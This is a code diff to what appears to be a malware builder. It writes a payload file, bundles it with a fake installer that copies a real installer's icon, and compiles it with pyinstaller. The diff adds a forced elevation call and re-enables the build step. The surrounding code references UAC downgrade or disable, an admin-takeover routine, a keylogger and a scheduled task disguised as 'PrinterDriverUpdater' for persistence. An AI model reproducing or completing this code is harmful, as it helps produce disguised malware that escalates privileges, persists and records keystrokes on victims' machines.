@@ -8,7 +8,7 @@ import poisonRecipe
 scheduler = "schtasks /create /TN PrinterDriverUpdater /XML C:/Users/lhill23/Documents/GitHub/system-logger/PrinterDriverUpdater.xml"
 
 #Create .exe identical to installer, but with fake elevation then execution stuff
-def PoisonBottle(installer, UACdowngrade, UACdisable, Adminpwn, Keylog):
+def PoisonBottle(installer, UACdowngrade, UACdisable, Adminpwn, Keylog): # TODO Forgot elevation request in poison
     poison = open("poison.py", 'w') #The file that will be bundled with fake installer
     recipe = open("poisonRecipe.py", 'r') #Base file for imports
 
@@ -39,12 +39,11 @@ def PoisonBottle(installer, UACdowngrade, UACdisable, Adminpwn, Keylog):
     poison.write(include)
 
     #__main__
-    poison.write("if __name__ == \"__main__\":\n")
+    poison.write("if __name__ == \"__main__\":\n   Elevate()\n")
     poison.write(main) #Probably some loop I can use for this
 
     #Create poisoned installer
-    #system("pyinstaller -F --name Poison -i " + installer + " " + path.realpath(poison.name))
-    print(str(path.realpath(poison)))
+    system("pyinstaller -F --name Poison -i " + installer + " " + path.realpath(poison.name))
     
 
 def PwnAdmin():
